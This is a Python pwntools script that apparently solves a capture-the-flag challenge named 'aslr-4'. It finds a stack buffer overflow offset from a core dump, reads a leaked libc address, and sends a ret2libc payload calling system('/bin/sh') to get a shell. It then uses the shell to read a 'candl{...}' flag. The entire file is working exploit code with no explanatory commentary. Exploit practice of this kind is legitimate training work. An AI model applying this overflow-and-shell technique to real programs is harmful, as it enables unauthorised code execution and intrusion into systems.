from pwn import *
import os

DEBUG = False 
file = "./aslr-4"
env = { "PATH":"$PATH:."} 

io = process(file, env)
io.send(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(0x100).find(p32(core.eip))
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

libc_addr = int(io.recvline().split(b" ")[-1].strip(), 16)
print("libc_addr:", hex(libc_addr))

binsh_off = 0xf7ed01db - 0xf7da3520
system_off = 0xf7d8f3d0 - 0xf7da3520

payload = b"a" * max_len + p32(libc_addr + system_off) + b"a" * 4 + p32(libc_addr + binsh_off)
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Please type', b'/bin/cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
